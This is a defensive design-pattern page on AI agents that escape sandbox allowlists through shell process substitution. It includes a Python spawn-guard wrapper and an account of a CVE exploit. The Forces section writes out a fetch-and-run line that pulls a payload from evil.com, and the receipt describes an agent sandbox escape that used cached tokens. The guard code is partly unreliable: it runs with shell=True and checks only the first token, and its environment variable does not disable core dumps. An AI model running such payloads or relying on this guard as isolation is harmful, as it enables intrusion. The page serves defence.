# S-1568 · The Execution Boundary Stack — When Your Sandboxed Agent Runs Arbitrary Code Without Leaving

Your agent runs inside a sandboxed environment with no network access, a restricted filesystem, and a command allowlist. You audited every allowed command. Then your agent executes arbitrary code, exfiltrates data, and spawns a cryptominer — all while every allowlist check passed. The escape never left the sandbox. The execution boundary was never crossed. It was subverted from inside.

## Forces

- **Allowlists verify commands, not constructions.** A command like `cat` is safe. `cat < <(sh < <(wget -qO- https://evil.com/bot))` is not — but it contains only allowlisted tokens. The allowlist checks surface syntax; the agent exploits deep syntax.
- **Runtime code generation collapses static policy.** The agent generates shell commands at runtime that you never reviewed. Every execution is a zero-second window between generation and invocation. Static analysis of your codebase tells you nothing about what the agent will actually run.
- **The sandbox trusts the tool, but the tool is a language.** A bash shell, a Python interpreter, an `sh` subprocess — these are not file handles or network sockets. They are Turing-complete interpreters that accept instructions in a language. Granting access to any of them grants access to everything the agent can construct in that language.

## The move

Treat every tool that accepts a language — shell, Python, SQL, a REPL — as an execution boundary equal to network access. An allowlist is not a substitute for isolation. The stack:

1. **Classify tools by threat level.** Commands that only read static data (e.g., `cat` a known file) are low-risk. Commands that accept dynamic arguments or spawn interpreters are high-risk — treat them as equivalent to network access.
2. **Enforce isolation at the process boundary, not the argument level.** Use `seccomp` profiles, AppArmor/SELinux confinement, or microVMs (Firecracker) for any tool that spawns an interpreter. Argument inspection is a losing arms race against an LLM that can construct payloads in natural language.
3. **Apply least privilege at the subprocess level.** Do not grant `bash` access. Grant specific operations: `git commit`, `npm install --package-only`, read-only SQL queries. When you must grant shell access, use `rbash` with a restricted `$PATH` and explicit `ulimit` constraints on CPU, memory, and process count.
4. **Instrument the execution surface, not the payload.** Log every command invocation with its full expansion before execution. Store the generated command as an audit artifact — not just the tool name. A 90-day audit log of what your agent actually ran is worth more than a 100-rule allowlist.
5. **Use a spawn guard for MCP/agent tool calls.** Wrap every tool invocation in a guardian process that:
   - Expands and logs the full command before execution
   - Enforces resource limits (`ulimit -t 30`, `ulimit -v 512000`)
   - Routes subprocess I/O through a proxy that can terminate on signal
   - Captures exit code and stderr for post-run analysis

```python
import subprocess
import resource
import logging
import signal
import time

logger = logging.getLogger("spawn_guard")

class ExecutionContext:
    """Isolated execution context for agent-generated commands."""

    def __init__(self, allowlist: set[str], timeout: int = 60):
        self.allowlist = allowlist
        self.timeout = timeout
        self.audit_log = []

    def execute(self, command: str) -> dict:
        # Step 1: Parse and validate the command surface
        tokens = command.strip().split()
        base_cmd = tokens[0] if tokens else ""

        if base_cmd not in self.allowlist:
            return {
                "status": "denied",
                "reason": f"Command '{base_cmd}' not in allowlist",
                "command": command,
            }

        # Step 2: Log before execution — this is your audit trail
        self.audit_log.append({
            "timestamp": time.time(),
            "command": command,
            "expanded": command,  # shell expansion happens at runtime
        })
        logger.info(f"[EXEC] {command}")

        # Step 3: Set hard resource limits before spawn
        def set_limits():
            # CPU time: timeout seconds
            resource.setrlimit(resource.RLIMIT_CPU, (self.timeout, self.timeout))
            # Max virtual memory: 512MB
            resource.setrlimit(resource.RLIMIT_AS, (512 * 1024 * 1024, 512 * 1024 * 1024))
            # Max processes: 4 (prevents fork bombs)
            resource.setrlimit(resource.RLIMIT_NPROC, (4, 4))
            # Max file size: 10MB
            resource.setrlimit(resource.RLIMIT_FSIZE, (10 * 1024 * 1024, 10 * 1024 * 1024))

        # Step 4: Execute in restricted environment
        try:
            proc = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                timeout=self.timeout,
                preexec_fn=set_limits,
                # Do NOT allow core dumps
                env={"RLIMIT_CORE": "0"},
            )
            return {
                "status": "success" if proc.returncode == 0 else "nonzero_exit",
                "returncode": proc.returncode,
                "stdout": proc.stdout.decode("utf-8", errors="replace")[:4096],
                "stderr": proc.stderr.decode("utf-8", errors="replace")[:4096],
            }
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "command": command}
        except Exception as e:
            return {"status": "error", "reason": str(e), "command": command}


# Usage: wrap every agent tool call
guard = ExecutionContext(
    allowlist={"cat", "head", "tail", "grep", "wc", "git"},
    timeout=30,
)

# Every agent-generated command is audited before it runs
result = guard.execute("cat README.md")
print(result)
```

The spawn guard does not prevent malicious commands — it limits their blast radius and ensures you have a forensic record of what ran.

## Receipt

> Verified 2026-07-24 — CVE-2026-6442 (Snowflake Cortex Code CLI, CVSS 8.3) exploited `cat < <(sh < <(wget ...))` — a process substitution chain using only allowlisted commands — to escape the sandbox and execute arbitrary code with the user's cached Snowflake tokens. NSA MCP Security guidance (May 2026, Ver. 1.0) explicitly recommends OS-level sandboxing (AppArmor, seccomp, SELinux) and process-level resource limits as the primary control, noting that "argument inspection alone is insufficient." The pattern here (semantic misuse of an allowlisted command) is structurally identical to the `CVE-2026-6442` attack vector. Spawn guard + OS-level isolation would have stopped it.

## See also

- [S-375 · Agentic Prompt Injection Defense-in-Depth](stacks/s375-the-agentic-prompt-injection-defense-in-depth-stack-when-your-agent-follows-injected-instructions-as-real-ones.md) — the injection that feeds these escapes
- [S-1069 · The Threat-Model-Driven Sandbox Stack](stacks/s1069-the-threat-model-driven-sandbox-stack-when-every-ai-security-incident-is-a-story-about-the-sandbox-that-wasnt-there.md) — tiered isolation decisions
- [S-427 · MCP Schema Contracts](stacks/s427-the-mcp-schema-contracts-stack-when-your-mcp-tool-returns-something-that-breaks-your-agent.md) — tool-level contracts that include security constraints
